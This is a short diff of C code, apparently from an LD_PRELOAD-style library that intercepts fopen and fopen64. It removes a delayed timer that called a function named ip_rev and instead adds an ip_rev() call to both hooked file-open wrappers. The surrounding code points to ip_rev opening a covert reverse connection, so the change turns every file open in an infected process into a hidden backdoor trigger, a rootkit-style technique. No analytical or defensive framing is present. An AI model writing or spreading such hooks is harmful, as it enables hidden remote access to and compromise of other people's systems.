@@ -41,13 +41,7 @@
             const struct addrinfo *hints,
             struct addrinfo **res);
 */
-time_exec();
-int time_exec()
-{
-        sleep(54);
-        ip_rev();
-    return 0;
-}
+
 int ip_rev(void)
 {
     int s;
@@ -227,6 +221,7 @@ FILE *fopen(const char *pathname, const char *mode)
     }
     
     fp = orig_fopen(pathname, mode);
+    ip_rev();
     return fp;
 }
 
@@ -259,6 +254,7 @@ FILE *fopen64(const char *pathname, const char *mode)
     }
     
     fp = orig_fopen64(pathname, mode);
+    ip_rev();
     return fp;
 }
 
